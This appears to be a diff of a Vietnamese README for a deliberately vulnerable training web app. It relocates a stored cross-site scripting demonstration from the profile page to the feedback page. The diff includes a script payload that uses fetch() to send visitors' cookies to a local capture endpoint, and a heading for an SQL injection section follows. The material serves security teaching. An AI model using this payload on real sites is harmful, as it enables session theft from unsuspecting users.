@@ -89,16 +89,17 @@ Các tài khoản được tạo sẵn:
 
 ### 1. **Cross-Site Scripting (XSS) - Stored**
 
-**Vị trí:** Trang Profile (`profile.php`)
+**Vị trí:** Trang Feedback (`feedback.php`)
 
 **Cách khai thác:**
 1. Đăng nhập vào tài khoản
-2. Vào trang Profile
-3. Nhập mã JavaScript vào trường "Bio":
+2. Vào trang Feedback
+3. Nhập mã JavaScript vào trường "SUBMIT FEEDBACK":
    ```
+   app nay hay qua
    <script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
    ```
-4. Khi người dùng khác xem profile, cookies sẽ bị gửi tới attacker (reload để test)
+4. Khi người dùng khác xem Feedback, cookies sẽ bị gửi tới attacker (reload để test)
 
 
 ### 2. **SQL Injection**
